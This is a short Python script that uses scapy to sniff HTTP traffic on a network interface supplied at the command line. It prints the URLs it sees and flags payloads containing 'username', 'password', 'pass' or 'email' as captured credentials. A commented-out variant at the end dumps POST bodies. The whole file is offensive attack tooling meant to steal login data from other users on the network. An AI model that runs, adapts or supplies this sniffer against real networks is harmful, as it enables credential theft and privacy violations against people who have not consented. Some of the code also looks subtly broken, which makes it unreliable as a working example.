import scapy.all as scapy
import argparse
from scapy.layers import http
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface",
     dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break

iface = get_interface()
sniff(iface)

# from scapy.all import *
# from scapy.layers.http import HTTPRequest

# def process_packet(packet):        
#     if packet.haslayer(HTTPRequest): 
#         url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
#         method = packet[HTTPRequest].Method.decode()
#         if packet.haslayer(Raw) and method == "POST":
#                 print(packet.summary)
#                 print({packet[Raw].load})
        
# if name == "main":
#     sniff(prn=process_packet)
